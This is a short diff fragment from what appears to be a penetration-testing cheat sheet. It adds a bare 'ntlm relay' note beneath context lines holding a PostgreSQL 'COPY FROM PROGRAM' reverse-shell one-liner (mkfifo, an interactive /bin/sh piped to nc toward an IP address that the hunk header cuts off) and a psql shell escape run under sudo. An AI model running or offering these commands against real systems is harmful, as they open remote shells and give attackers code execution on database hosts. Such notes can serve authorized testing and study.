@@ -151,3 +151,5 @@ COPY temp FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 19
 sudo psql --host=127.0.0.1 -U postgres
 
 \! /bin/sh
+
+ntlm relay
